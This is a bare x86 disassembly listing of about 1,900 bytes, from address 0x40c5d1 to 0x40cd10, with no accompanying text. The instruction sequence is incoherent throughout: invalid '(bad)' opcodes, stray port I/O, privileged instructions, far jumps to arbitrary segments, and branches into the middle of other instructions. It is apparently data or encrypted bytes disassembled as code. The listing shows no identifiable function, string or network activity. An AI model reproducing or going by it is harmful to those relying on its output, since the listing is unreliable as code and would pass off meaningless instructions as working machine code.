  40c5d1:	mov    eax,ds:0xc55e460f
  40c5d6:	jle    0x40c604
  40c5d8:	xor    BYTE PTR [eax+0x4f],bh
  40c5db:	in     eax,dx
  40c5dc:	les    ecx,FWORD PTR [ebx-0x41]
  40c5df:	push   eax
  40c5e0:	in     al,dx
  40c5e1:	pop    edx
  40c5e2:	or     edi,DWORD PTR [edx+0x39e05fb6]
  40c5e8:	lods   eax,DWORD PTR ds:[esi]
  40c5e9:	sub    edi,ecx
  40c5eb:	add    dh,BYTE PTR [esi-0x5d7a9b65]
  40c5f1:	jmp    DWORD PTR [ebp+0x3bb4e5b1]
  40c5f7:	cmc    
  40c5f8:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c5fa:	cmp    ecx,edi
  40c5fc:	mov    eax,DWORD PTR [edx]
  40c5fe:	xchg   ebp,eax
  40c5ff:	ret    0xec3b
  40c602:	mov    eax,ds:0xd4a0343d
  40c607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c608:	fisubr DWORD PTR [esi+ebx*1-0x6a]
  40c60c:	pushf  
  40c60d:	jl     0x40c606
  40c60f:	sahf   
  40c610:	ins    BYTE PTR es:[edi],dx
  40c611:	push   eax
  40c612:	add    dl,BYTE PTR [edi]
  40c614:	out    dx,eax
  40c615:	lea    esp,[edi-0x44]
  40c618:	push   ecx
  40c619:	loope  0x40c5ca
  40c61b:	das    
  40c61c:	stc    
  40c61d:	icebp  
  40c61e:	add    eax,0xab31d56a
  40c623:	out    0x90,al
  40c625:	pop    ds
  40c626:	test   BYTE PTR [edx+0x26],dh
  40c629:	cmp    edi,DWORD PTR [ebx]
  40c62b:	ret    
  40c62c:	in     al,0xa1
  40c62e:	aas    
  40c62f:	mov    eax,ds:0xe8a3fb13
  40c634:	add    BYTE PTR [eax],ah
  40c636:	jge    0x40c5e7
  40c638:	int3   
  40c639:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c63a:	inc    ecx
  40c63b:	(bad)  
  40c63c:	pop    ebx
  40c63d:	sti    
  40c63e:	xchg   di,ax
  40c640:	icebp  
  40c641:	jmp    0xe49d754a
  40c646:	mov    bl,0xe0
  40c648:	adc    bl,BYTE PTR [ebx-0x13]
  40c64b:	pushf  
  40c64c:	ja     0x40c6b8
  40c64e:	xor    al,0x7b
  40c650:	jle    0x40c61e
  40c652:	fisub  DWORD PTR [esi+edi*4]
  40c655:	enter  0x365e,0xdd
  40c659:	popa   
  40c65a:	sub    esp,edi
  40c65c:	pop    eax
  40c65d:	test   BYTE PTR [ebx-0x7a],dl
  40c660:	xchg   esi,eax
  40c661:	mov    al,BYTE PTR [esi-0xa]
  40c664:	mov    ebp,0x6efcfe74
  40c669:	add    ecx,0xffffffba
  40c66c:	and    DWORD PTR [edi+0x6a],eax
  40c66f:	push   ecx
  40c670:	jns    0x40c6e2
  40c672:	mov    dh,0x11
  40c674:	inc    ebp
  40c675:	call   0xecbe:0x6b106d18
  40c67c:	sub    al,0xac
  40c67e:	mov    eax,ds:0x1f5adec6
  40c683:	cmc    
  40c684:	xchg   DWORD PTR [edx],ebp
  40c686:	fsubr  st(1),st
  40c688:	mov    esp,0x73f39f45
  40c68d:	and    DWORD PTR [esp+ebp*2],edx
  40c690:	mov    edi,DWORD PTR [edi+ebx*1]
  40c693:	test   DWORD PTR [edi+0x18de5a3f],edi
  40c699:	pop    edx
  40c69a:	xchg   BYTE PTR fs:0x9099a05d,ch
  40c6a1:	outs   dx,DWORD PTR ds:[esi]
  40c6a2:	pop    ecx
  40c6a3:	dec    edx
  40c6a4:	sahf   
  40c6a5:	lock int3 
  40c6a7:	inc    esp
  40c6a8:	(bad)  
  40c6a9:	sbb    eax,0x7daff073
  40c6ae:	pop    ebx
  40c6af:	fnstcw WORD PTR [eax+ecx*1+0x5975e48a]
  40c6b6:	ror    BYTE PTR [esi],cl
  40c6b8:	out    dx,al
  40c6b9:	mov    eax,ds:0xe9e3a9e5
  40c6be:	sbb    BYTE PTR [esi],al
  40c6c0:	hlt    
  40c6c1:	iret   
  40c6c2:	adc    ch,dh
  40c6c4:	ds pop es
  40c6c6:	lahf   
  40c6c7:	adc    eax,0x6273283f
  40c6cc:	jmp    0x5fa1:0x2984b8ba
  40c6d3:	test   BYTE PTR [ebp+0x28],ah
  40c6d6:	arpl   WORD PTR [esi-0x5110aeff],dx
  40c6dc:	and    al,0x4b
  40c6de:	lods   eax,DWORD PTR ds:[esi]
  40c6df:	es inc ecx
  40c6e1:	fisub  WORD PTR ds:0x28dbbb92
  40c6e7:	jg     0x40c679
  40c6e9:	sub    BYTE PTR [esi+0x2f],ah
  40c6ec:	mov    cl,0xee
  40c6ee:	inc    ebp
  40c6ef:	jae    0x40c707
  40c6f1:	pop    esi
  40c6f2:	and    eax,DWORD PTR [edx+0x20]
  40c6f5:	xchg   esi,eax
  40c6f6:	aas    
  40c6f7:	add    bl,0x7f
  40c6fa:	push   ds
  40c6fb:	add    al,BYTE PTR [ebx+0x12]
  40c6fe:	jge    0x40c6e5
  40c700:	fs pop edx
  40c702:	(bad)  
  40c704:	jmp    0x37083c17
  40c709:	out    dx,al
  40c70a:	dec    edx
  40c70b:	loop   0x40c73e
  40c70d:	xchg   edx,eax
  40c70e:	stc    
  40c70f:	mov    ecx,DWORD PTR [ebx-0x37]
  40c712:	mov    al,0x86
  40c714:	push   esi
  40c715:	sub    dl,BYTE PTR [eax+0x6de80497]
  40c71b:	jge    0x40c72e
  40c71d:	in     eax,dx
  40c71e:	mov    ebp,0xb2de9be6
  40c723:	outs   dx,BYTE PTR ds:[esi]
  40c724:	mov    edi,0x810568a4
  40c729:	outs   dx,DWORD PTR ds:[esi]
  40c72a:	or     eax,DWORD PTR [ebp+0x1e5377e8]
  40c730:	dec    eax
  40c731:	cwde   
  40c732:	out    0x5e,eax
  40c734:	dec    ebp
  40c735:	inc    ecx
  40c736:	das    
  40c737:	xlat   BYTE PTR ds:[ebx]
  40c738:	pushf  
  40c739:	out    0xc0,al
  40c73b:	mov    al,0x31
  40c73d:	sbb    al,0xe7
  40c73f:	cmp    al,0x27
  40c741:	push   ds
  40c742:	adc    DWORD PTR [edx],edi
  40c744:	jge    0x40c7bb
  40c746:	cld    
  40c747:	inc    edx
  40c748:	push   ecx
  40c749:	sbb    al,0x3e
  40c74b:	jmp    0x63dd:0xcaa81a23
  40c752:	ds mov cl,0xc2
  40c755:	fnstcw WORD PTR [ecx+esi*8]
  40c758:	adc    eax,0xc76ded3a
  40c75d:	pop    esi
  40c75e:	mov    bh,0xda
  40c760:	pushf  
  40c761:	add    BYTE PTR [edi+0x21],dh
  40c764:	out    0x6f,al
  40c766:	or     esp,ebx
  40c768:	ret    0xd88e
  40c76b:	cmp    eax,0x56daf932
  40c770:	sbb    al,0xa0
  40c772:	add    BYTE PTR [edx],dl
  40c774:	jmp    0x7fd3:0xf51328e7
  40c77b:	and    edx,DWORD PTR [edi-0x22753afe]
  40c781:	pop    ecx
  40c782:	jo     0x40c7be
  40c784:	dec    esi
  40c785:	add    al,0x98
  40c787:	ins    DWORD PTR es:[edi],dx
  40c788:	ja     0x40c732
  40c78a:	aaa    
  40c78b:	sbb    al,0xea
  40c78d:	inc    ecx
  40c78e:	pop    edx
  40c78f:	jmp    0x40c71f
  40c791:	mov    ebp,0xe47e82e4
  40c796:	call   0xd6d899c1
  40c79b:	ins    BYTE PTR es:[edi],dx
  40c79c:	xor    DWORD PTR [edi+0x501f2074],ebp
  40c7a2:	mov    ebx,0xfa42cf15
  40c7a7:	adc    DWORD PTR [ebp+0x3d],esi
  40c7aa:	mov    ch,0x35
  40c7ac:	and    eax,DWORD PTR [esp+ebx*8+0x45db93a2]
  40c7b3:	iret   
  40c7b4:	mov    esi,0x3d6dabab
  40c7b9:	pop    esi
  40c7ba:	scas   al,BYTE PTR es:[edi]
  40c7bb:	and    eax,0xf7c65eab
  40c7c0:	cmp    eax,0x49fe17ca
  40c7c5:	dec    DWORD PTR [edx]
  40c7c7:	call   0xad2dd330
  40c7cc:	add    al,0x33
  40c7ce:	test   al,0x54
  40c7d0:	out    0x8f,eax
  40c7d2:	push   ss
  40c7d3:	(bad)  
  40c7d4:	push   ebx
  40c7d5:	pop    esi
  40c7d6:	mov    BYTE PTR [eax-0x191ec8e2],dl
  40c7dc:	xchg   ecx,eax
  40c7dd:	repz pop edx
  40c7df:	mov    WORD PTR [esi+0x5d9daf9c],?
  40c7e5:	sar    BYTE PTR [edx+0x45],cl
  40c7e8:	mov    ah,0xf9
  40c7ea:	cld    
  40c7eb:	inc    ebp
  40c7ec:	mov    edx,0xce471930
  40c7f1:	pop    edi
  40c7f2:	xchg   esp,ecx
  40c7f4:	xchg   edx,eax
  40c7f5:	dec    ebx
  40c7f6:	and    dl,0xd7
  40c7f9:	mov    ecx,0x53591162
  40c7fe:	sub    edx,DWORD PTR [esi+0x6]
  40c801:	lahf   
  40c802:	push   esi
  40c803:	mov    ds:0xf08ef532,eax
  40c808:	outs   dx,BYTE PTR ds:[esi]
  40c809:	js     0x40c854
  40c80b:	jne    0x40c7cf
  40c80d:	jnp    0x40c815
  40c80f:	xor    BYTE PTR [ebx],ch
  40c811:	jecxz  0x40c7e7
  40c813:	repz push ecx
  40c815:	hlt    
  40c816:	shl    cl,1
  40c818:	pop    ebx
  40c819:	(bad)  
  40c81a:	jns    0x40c818
  40c81c:	jmp    0x42ffe31a
  40c821:	mov    ebp,0xdbbd3b8c
  40c826:	mov    ds:0x723adc73,eax
  40c82b:	jae    0x40c846
  40c82d:	daa    
  40c82e:	gs call 0x4f745aa3
  40c834:	(bad)  [esi]
  40c836:	xor    BYTE PTR [ebx+0x7a],dh
  40c839:	(bad)  
  40c83a:	(bad)  
  40c83b:	jb     0x40c872
  40c83d:	lods   eax,DWORD PTR ds:[esi]
  40c83e:	je     0x40c7d9
  40c840:	xchg   edi,edi
  40c842:	mov    ebp,0xb8c04e98
  40c847:	jnp    0x40c85f
  40c849:	ret    
  40c84a:	add    DWORD PTR [edx-0x5eb9d826],ebx
  40c850:	push   ss
  40c851:	retf   
  40c852:	pop    eax
  40c853:	xor    eax,0xa61a68d9
  40c858:	dec    esp
  40c859:	dec    eax
  40c85a:	or     ecx,eax
  40c85c:	push   0x57
  40c85e:	or     esi,esi
  40c860:	jae    0x40c7f7
  40c862:	pop    esp
  40c863:	sar    DWORD PTR [ebp-0x3faec8f3],cl
  40c869:	lods   al,BYTE PTR ds:[esi]
  40c86a:	ret    
  40c86b:	je     0x40c87a
  40c86d:	lahf   
  40c86e:	jnp    0x40c865
  40c870:	fcomp  DWORD PTR [ecx]
  40c872:	mov    dl,0x52
  40c874:	cmp    eax,0x99a428cd
  40c879:	retf   0xd23
  40c87c:	jbe    0x40c8bc
  40c87e:	jg     0x40c8db
  40c880:	xchg   esp,eax
  40c881:	mov    al,ds:0x14c6f481
  40c886:	pop    ecx
  40c887:	add    bl,cl
  40c889:	xor    bh,BYTE PTR ds:0x6eb031b6
  40c88f:	push   es
  40c890:	mov    ebp,0xe7356905
  40c895:	add    eax,0xb257c8d9
  40c89a:	push   esi
  40c89b:	sbb    esi,DWORD PTR [ebx-0x52c4425]
  40c8a1:	inc    esp
  40c8a2:	jns    0x40c8a0
  40c8a4:	xor    edx,eax
  40c8a6:	cdq    
  40c8a7:	fs jle 0x40c8a0
  40c8aa:	xchg   edx,eax
  40c8ab:	add    BYTE PTR [ebx],0xbc
  40c8ae:	adc    edx,DWORD PTR [ebp+0x74]
  40c8b1:	jmp    0x7a63:0xcc20fa70
  40c8b8:	ja     0x40c8d2
  40c8ba:	mov    dh,0x72
  40c8bc:	int3   
  40c8bd:	adc    ebx,DWORD PTR [edi-0x9]
  40c8c0:	arpl   WORD PTR [edx],si
  40c8c2:	lods   eax,DWORD PTR ds:[esi]
  40c8c3:	mov    cl,0xd5
  40c8c5:	sbb    cl,bh
  40c8c7:	rcl    eax,1
  40c8c9:	adc    al,0x9e
  40c8cb:	add    al,0x2
  40c8cd:	aad    0x77
  40c8cf:	mov    dh,0x36
  40c8d1:	mov    eax,0xc8acefba
  40c8d6:	mov    edx,0xc3631cc2
  40c8db:	xor    BYTE PTR [edi-0x15],bl
  40c8de:	out    0x61,eax
  40c8e0:	pop    esp
  40c8e1:	fsub   QWORD PTR [esi-0x60]
  40c8e4:	mov    esp,0x82f2a3d4
  40c8e9:	and    DWORD PTR ds:0xa2e6a747,ecx
  40c8ef:	add    DWORD PTR [esp+edx*2+0x652d5ae7],eax
  40c8f6:	pop    edi
  40c8f7:	ss mov bl,0x22
  40c8fa:	jae    0x40c8d0
  40c8fc:	sbb    eax,0xa84905d2
  40c901:	pop    ds
  40c902:	(bad)  
  40c903:	xor    al,0x7f
  40c905:	sub    DWORD PTR [ebx],ebx
  40c907:	fadd   st,st(7)
  40c909:	add    al,0xbb
  40c90b:	or     ah,BYTE PTR [edi-0x80]
  40c90e:	inc    eax
  40c90f:	xor    dl,BYTE PTR [eax-0xc]
  40c912:	lea    esi,[edx]
  40c914:	out    0x9,al
  40c916:	pop    esp
  40c917:	bound  esi,QWORD PTR [edi+0x59]
  40c91a:	in     eax,dx
  40c91b:	sti    
  40c91c:	xchg   esi,eax
  40c91d:	arpl   dx,dx
  40c91f:	push   0xa234eeb
  40c924:	and    ebx,ebp
  40c926:	jp     0x40c94a
  40c928:	adc    al,0x1e
  40c92a:	cwde   
  40c92b:	xor    eax,DWORD PTR [esi+0x7652bcb]
  40c931:	pop    ss
  40c932:	je     0x40c952
  40c934:	adc    BYTE PTR [edx],ah
  40c936:	int    0xaf
  40c938:	sub    BYTE PTR [esi+0x517535a],dh
  40c93e:	lods   al,BYTE PTR ds:[esi]
  40c93f:	mov    ?,eax
  40c941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c942:	or     al,BYTE PTR [edx]
  40c944:	dec    eax
  40c945:	push   0x9ee442cd
  40c94a:	dec    eax
  40c94b:	mov    edx,0xc4cb6d1a
  40c950:	xchg   edi,eax
  40c951:	cmp    al,0x20
  40c953:	wbinvd 
  40c955:	cmp    al,0xa6
  40c957:	ror    DWORD PTR [esp+ebx*2+0x5f471683],1
  40c95e:	in     al,dx
  40c95f:	or     eax,0xd64da6cd
  40c964:	xor    ebp,edx
  40c966:	jne    0x40c8e8
  40c968:	out    dx,eax
  40c969:	popa   
  40c96a:	test   DWORD PTR [ebx+0x1e],edx
  40c96d:	add    BYTE PTR [edx],0x92
  40c970:	fcmovnb st,st(5)
  40c972:	push   ebx
  40c973:	hlt    
  40c974:	push   eax
  40c975:	into   
  40c976:	jns    0x40c942
  40c978:	popf   
  40c979:	addr16 loope 0x40c923
  40c97c:	mov    BYTE PTR [edx+0x54a0e0dc],al
  40c982:	imul   ecx,ebp,0xffffff92
  40c985:	outs   dx,BYTE PTR ds:[esi]
  40c986:	dec    ecx
  40c987:	fimul  WORD PTR [eax+eiz*4+0x5]
  40c98b:	loope  0x40c9c7
  40c98d:	jo     0x40c92a
  40c98f:	xor    al,0x0
  40c991:	adc    bh,BYTE PTR [ecx-0x1c]
  40c994:	push   eax
  40c995:	scas   al,BYTE PTR es:[edi]
  40c996:	ins    BYTE PTR es:[edi],dx
  40c997:	pop    eax
  40c998:	out    dx,al
  40c999:	dec    edx
  40c99a:	(bad)  
  40c99b:	push   ss
  40c99c:	jp     0x40c993
  40c99e:	xchg   bh,dl
  40c9a0:	inc    edi
  40c9a1:	jecxz  0x40c943
  40c9a3:	call   0x246b:0x5d12cf93
  40c9aa:	iret   
  40c9ab:	not    DWORD PTR [eax-0x59]
  40c9ae:	pop    esp
  40c9af:	lds    ecx,FWORD PTR [esi-0x1d690b52]
  40c9b5:	xchg   ebx,eax
  40c9b6:	test   BYTE PTR [esi-0x34],dh
  40c9b9:	loopne 0x40c9b6
  40c9bb:	lods   eax,DWORD PTR ds:[esi]
  40c9bc:	mov    ds:0xd2ca015c,eax
  40c9c1:	xchg   BYTE PTR [ecx],bl
  40c9c3:	shl    al,1
  40c9c5:	xchg   esp,eax
  40c9c6:	sti    
  40c9c7:	mov    al,0x2f
  40c9c9:	sbb    al,0xa7
  40c9cb:	ins    DWORD PTR es:[edi],dx
  40c9cc:	add    dl,BYTE PTR [ebx+esi*2-0x58095aa8]
  40c9d3:	daa    
  40c9d4:	and    bl,BYTE PTR [edx+edx*4+0x58553ca6]
  40c9db:	inc    ebp
  40c9dc:	pop    ebp
  40c9dd:	js     0x40ca0a
  40c9df:	push   ebx
  40c9e0:	mov    eax,0xce76d8d9
  40c9e5:	pusha  
  40c9e6:	in     al,0x7e
  40c9e8:	mov    WORD PTR [esi],gs
  40c9ea:	and    cl,bl
  40c9ec:	dec    edx
  40c9ed:	sbb    dl,ah
  40c9ef:	popa   
  40c9f0:	test   eax,0x3aafcd62
  40c9f5:	clc    
  40c9f6:	rcr    DWORD PTR [eax],cl
  40c9f8:	ret    
  40c9f9:	or     al,BYTE PTR [ebx]
  40c9fb:	inc    ebp
  40c9fc:	lahf   
  40c9fd:	push   cs
  40c9fe:	inc    eax
  40c9ff:	clc    
  40ca00:	int    0x14
  40ca02:	inc    edi
  40ca03:	cmp    ah,BYTE PTR [ecx-0x7a]
  40ca06:	lods   al,BYTE PTR ds:[esi]
  40ca07:	jnp    0x40c9bc
  40ca09:	jns    0x40c993
  40ca0b:	iret   
  40ca0c:	data16 sbb al,0x54
  40ca0f:	xchg   esp,eax
  40ca10:	sbb    al,0x86
  40ca12:	cmp    BYTE PTR [edx+ecx*2-0x10],cl
  40ca16:	inc    ebx
  40ca17:	or     dh,cl
  40ca19:	mov    esi,0x93da2973
  40ca1e:	xchg   ebp,eax
  40ca1f:	and    eax,0x664aa753
  40ca24:	adc    esp,DWORD PTR [esi+0x7]
  40ca27:	rcl    BYTE PTR [edi+eiz*1-0x61],cl
  40ca2b:	in     eax,dx
  40ca2c:	sub    esi,edx
  40ca2e:	and    ah,BYTE PTR [ebx+0x4fae7200]
  40ca34:	jae    0x40ca83
  40ca36:	cdq    
  40ca37:	into   
  40ca38:	outs   dx,DWORD PTR ds:[esi]
  40ca39:	and    eax,0xe7045e63
  40ca3e:	cmp    al,0xad
  40ca40:	push   edx
  40ca41:	xchg   ecx,eax
  40ca42:	fiadd  DWORD PTR [esi-0x14bf9e89]
  40ca48:	pushf  
  40ca49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca4a:	sbb    eax,DWORD PTR [esi-0x3f]
  40ca4d:	in     al,dx
  40ca4e:	inc    eax
  40ca4f:	enter  0xe985,0x6f
  40ca53:	inc    edi
  40ca54:	(bad)  
  40ca55:	mov    bl,0x29
  40ca57:	out    0x85,eax
  40ca59:	fprem  
  40ca5b:	push   cs
  40ca5c:	ja     0x40ca91
  40ca5e:	imul   BYTE PTR [edx]
  40ca60:	icebp  
  40ca61:	jb     0x40cade
  40ca63:	add    edx,DWORD PTR [ecx]
  40ca65:	xor    DWORD PTR [esi],edi
  40ca67:	(bad)  
  40ca68:	xchg   ebx,eax
  40ca69:	cmp    BYTE PTR [eax+ecx*2-0x80],bh
  40ca6d:	mov    esi,0x95c79daa
  40ca72:	rcr    DWORD PTR [ebx],cl
  40ca74:	shl    BYTE PTR [edi+eax*8-0x58],1
  40ca78:	xchg   ebx,eax
  40ca79:	aas    
  40ca7a:	(bad)  
  40ca7b:	sub    al,0xbe
  40ca7d:	cld    
  40ca7e:	iret   
  40ca7f:	push   ds
  40ca80:	int    0x9a
  40ca82:	adc    eax,0xdb26f4bc
  40ca87:	sub    eax,0xf0478b58
  40ca8c:	adc    eax,esi
  40ca8e:	data16 mov al,ds:0x297cb70f
  40ca94:	icebp  
  40ca95:	and    DWORD PTR [eax],edx
  40ca97:	dec    ah
  40ca99:	dec    ebp
  40ca9a:	and    dl,0x64
  40ca9d:	(bad)  
  40ca9e:	and    ebp,DWORD PTR [ebx+0x24]
  40caa1:	addr16 fscale 
  40caa4:	sbb    DWORD PTR [eax+0x714cbeb6],edx
  40caaa:	pusha  
  40caab:	mov    ah,BYTE PTR [ebp+0x7b83ff16]
  40cab1:	cwde   
  40cab2:	repnz mov ss,WORD PTR [eax-0x55]
  40cab6:	add    al,0xd
  40cab8:	adc    eax,0xb6ba0f60
  40cabd:	xchg   ebp,eax
  40cabe:	call   0x57f:0x4291bc04
  40cac5:	jmp    0x36ab577e
  40caca:	push   esp
  40cacb:	outs   dx,DWORD PTR ds:[esi]
  40cacc:	fcomp  DWORD PTR [eax]
  40cace:	cmp    cl,dh
  40cad0:	mov    eax,ds:0x193f7ca
  40cad5:	xor    DWORD PTR [eax+0x75],edi
  40cad8:	int    0x33
  40cada:	out    dx,al
  40cadb:	xchg   ebx,eax
  40cadc:	call   0xb04db885
  40cae1:	rcl    ecx,0x53
  40cae4:	xchg   ch,bl
  40cae6:	or     BYTE PTR [esi],ch
  40cae8:	loope  0x40cb22
  40caea:	jns    0x25f0e95b
  40caf0:	fild   DWORD PTR [esi]
  40caf2:	lahf   
  40caf3:	dec    eax
  40caf4:	jg     0x40cb48
  40caf6:	fidivr DWORD PTR [eax-0x7181e7ca]
  40cafc:	cmp    eax,0xe226f30a
  40cb01:	test   ebx,0x29e66f83
  40cb07:	daa    
  40cb08:	sbb    al,0xa
  40cb0a:	xlat   BYTE PTR ds:[ebx]
  40cb0b:	inc    esp
  40cb0c:	icebp  
  40cb0d:	adc    DWORD PTR [esp+edi*4-0x5c4299db],ebp
  40cb14:	call   0x219fb03
  40cb19:	ficom  WORD PTR [edi-0x5]
  40cb1c:	rol    esi,0xf6
  40cb1f:	xchg   ebx,eax
  40cb20:	inc    ebx
  40cb21:	fdivrp st(1),st
  40cb23:	pop    edi
  40cb24:	out    dx,eax
  40cb25:	je     0x40cb19
  40cb27:	fst    st(3)
  40cb29:	jp     0x40cb99
  40cb2b:	loopne 0x40cba2
  40cb2d:	sti    
  40cb2e:	jecxz  0x40cb59
  40cb30:	cmc    
  40cb31:	mov    ebp,DWORD PTR [eax]
  40cb33:	adc    ecx,DWORD PTR [esi+0x6d]
  40cb36:	mov    eax,0x64530f6c
  40cb3b:	jg     0x40cb48
  40cb3d:	icebp  
  40cb3e:	sar    edx,0xe2
  40cb41:	mov    DWORD PTR ds:0x11eab471,ebx
  40cb47:	push   0xffffffee
  40cb49:	daa    
  40cb4a:	add    BYTE PTR [edi-0x704998e],ah
  40cb50:	loop   0x40caee
  40cb52:	fiadd  WORD PTR [eax+ebp*2]
  40cb55:	scas   al,BYTE PTR es:[edi]
  40cb56:	jg     0x40cb9a
  40cb58:	add    esp,DWORD PTR [edi+0x3e06a71e]
  40cb5e:	xchg   ebp,eax
  40cb5f:	fwait
  40cb60:	sub    BYTE PTR [edx+0x55b4bf8a],al
  40cb66:	jbe    0x40cbba
  40cb68:	mov    WORD PTR [edi+0x67e5e79],?
  40cb6e:	ins    BYTE PTR es:[edi],dx
  40cb6f:	or     bh,BYTE PTR ds:0xcad4b229
  40cb75:	jnp    0x40cafe
  40cb77:	inc    esi
  40cb78:	mov    esp,0xfb3e33bc
  40cb7d:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40cb7f:	outs   dx,DWORD PTR ds:[esi]
  40cb80:	dec    ecx
  40cb81:	pop    eax
  40cb82:	(bad)  
  40cb83:	jo     0x40cb7c
  40cb85:	xchg   esp,eax
  40cb86:	adc    al,0x30
  40cb88:	sbb    ch,BYTE PTR [edx-0x68]
  40cb8b:	xchg   esp,eax
  40cb8c:	mov    esp,0xb197228d
  40cb91:	test   al,0xf4
  40cb93:	mov    dl,0xef
  40cb95:	fisttp WORD PTR [esi+0x6a]
  40cb98:	retf   0x2d71
  40cb9b:	pop    edi
  40cb9c:	cmp    edi,ebx
  40cb9e:	dec    eax
  40cb9f:	cmc    
  40cba0:	stos   WORD PTR es:[edi],ax
  40cba2:	or     DWORD PTR [ecx-0x53],edx
  40cba5:	push   0x3cfc2448
  40cbaa:	in     al,0xe3
  40cbac:	lock pop ecx
  40cbae:	sub    eax,0xf7631325
  40cbb3:	jmp    0x5ef0:0x66bca087
  40cbba:	loopne 0x40cc2c
  40cbbc:	dec    edi
  40cbbd:	repz out 0xde,al
  40cbc0:	fisttp WORD PTR [edx+ecx*4]
  40cbc3:	xchg   esp,eax
  40cbc4:	test   esi,edx
  40cbc6:	rol    DWORD PTR [ebx-0x1e4cf6e6],1
  40cbcc:	cdq    
  40cbcd:	jns    0x40cbbf
  40cbcf:	jp     0x40cb62
  40cbd1:	lods   eax,DWORD PTR ds:[esi]
  40cbd2:	cmp    BYTE PTR [esi],0x5c
  40cbd5:	jne    0x40cb6d
  40cbd7:	mov    DWORD PTR [esi+eax*2-0x5e],ebp
  40cbdb:	mov    dl,0xb
  40cbdd:	imul   esi,ebp,0xffffffb2
  40cbe0:	pop    eax
  40cbe1:	xor    eax,edx
  40cbe3:	stos   DWORD PTR es:[edi],eax
  40cbe4:	shl    ecx,1
  40cbe6:	retf   
  40cbe7:	js     0x40cc26
  40cbe9:	or     DWORD PTR [edi+0x14],ecx
  40cbec:	or     esi,DWORD PTR [edi-0xbd236fa]
  40cbf2:	bnd jp 0x40cba9
  40cbf5:	and    ecx,edi
  40cbf7:	hlt    
  40cbf8:	mov    esp,0x489f96ed
  40cbfd:	cli    
  40cbfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbff:	and    ebx,DWORD PTR [ecx+0x71]
  40cc02:	jge    0x40cc1f
  40cc04:	jmp    0x5a73766
  40cc09:	cs pop ds
  40cc0b:	rcl    ebp,cl
  40cc0d:	pop    ecx
  40cc0e:	popf   
  40cc0f:	mov    cs,ebx
  40cc11:	lods   eax,DWORD PTR ds:[esi]
  40cc12:	add    DWORD PTR [esp+eax*8+0x71],edi
  40cc16:	in     al,dx
  40cc17:	add    cl,BYTE PTR [eax+0x1c]
  40cc1a:	lock ins BYTE PTR es:[edi],dx
  40cc1c:	jmp    0xfca472c8
  40cc21:	xchg   edx,eax
  40cc22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc23:	es data16 hlt 
  40cc26:	(bad)  
  40cc27:	mov    ebp,0x7be7b915
  40cc2c:	fs loopne 0x40cc2d
  40cc2f:	out    dx,al
  40cc30:	push   es
  40cc31:	test   DWORD PTR [edi-0x4a],eax
  40cc34:	repz iret 
  40cc36:	push   esi
  40cc37:	daa    
  40cc38:	test   esi,eax
  40cc3a:	push   DWORD PTR [esi+eax*2+0x4b80691e]
  40cc41:	in     al,dx
  40cc42:	inc    ebp
  40cc43:	outs   dx,DWORD PTR ds:[esi]
  40cc44:	les    ebp,FWORD PTR ds:0x5844b71c
  40cc4a:	ret    
  40cc4b:	xor    ecx,esi
  40cc4d:	inc    ebx
  40cc4e:	fsub   st(0),st
  40cc50:	std    
  40cc51:	and    eax,0x6f17f79
  40cc56:	loop   0x40cc23
  40cc58:	bound  esi,QWORD PTR [edx]
  40cc5a:	jmp    ebx
  40cc5c:	aaa    
  40cc5d:	in     al,dx
  40cc5e:	pop    edx
  40cc5f:	aas    
  40cc60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc62:	mov    DWORD PTR [eax+0x4],eax
  40cc65:	sbb    eax,0x3524e588
  40cc6a:	pop    ebx
  40cc6b:	xchg   esp,eax
  40cc6c:	call   0x6e96:0x5fa5dab3
  40cc73:	(bad)  
  40cc74:	jl     0x40cc7a
  40cc76:	xor    eax,DWORD PTR [ebx+0x48]
  40cc79:	mov    ds:0x60dd7ba,eax
  40cc7e:	fnsave [edx-0x34]
  40cc81:	das    
  40cc82:	test   BYTE PTR [ecx+0x9833341],dl
  40cc88:	cmp    al,0x82
  40cc8a:	scas   eax,DWORD PTR es:[edi]
  40cc8b:	daa    
  40cc8c:	jo     0x40ccaa
  40cc8e:	xor    ecx,esi
  40cc90:	retf   0x7203
  40cc93:	fsubr  QWORD PTR [ebp+0x17657c4e]
  40cc99:	call   0x3b95b322
  40cc9e:	daa    
  40cc9f:	(bad)  
  40cca0:	aaa    
  40cca1:	xor    esp,DWORD PTR [esi+0x40]
  40cca4:	(bad)  
  40cca5:	fwait
  40cca6:	es sub eax,0xfd2797a8
  40ccac:	mov    edi,gs
  40ccae:	mov    BYTE PTR [edx-0x18],bh
  40ccb1:	xchg   ebx,eax
  40ccb2:	and    eax,0xc7699abd
  40ccb7:	sub    eax,0x4d49eda
  40ccbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccbd:	inc    edx
  40ccbe:	nop
  40ccbf:	add    BYTE PTR [ebp+0x76c89c85],cl
  40ccc5:	lea    ebp,cs:[esi-0x2b]
  40ccc9:	inc    edx
  40ccca:	in     al,0x90
  40cccc:	jo     0x40cd17
  40ccce:	push   0x76bfcf42
  40ccd3:	aad    0x55
  40ccd5:	imul   ebp,DWORD PTR [ebp+0x67],0x42f8fc16
  40ccdc:	mov    bh,0x40
  40ccde:	xor    BYTE PTR [edx+0x31],dh
  40cce1:	jbe    0x40cd4b
  40cce3:	push   ecx
  40cce4:	fld    TBYTE PTR [edi+0x6e]
  40cce7:	and    esp,DWORD PTR [eax+0x4f042c87]
  40cced:	push   ss
  40ccee:	in     al,dx
  40ccef:	mov    esi,0x2d414525
  40ccf4:	je     0x40ccac
  40ccf6:	imul   edi,edi,0x3920ca8c
  40ccfc:	mov    eax,ds:0x28ee5237
  40cd01:	les    edx,FWORD PTR [ecx-0x59]
  40cd04:	sub    al,0xd
  40cd06:	mov    ch,0x81
  40cd08:	sbb    bl,BYTE PTR [edi-0x67]
  40cd0b:	add    al,0x5c
  40cd0e:	jo     0x40cd79
  40cd10:	lds    esp,FWORD PTR ds:0x537eb98c
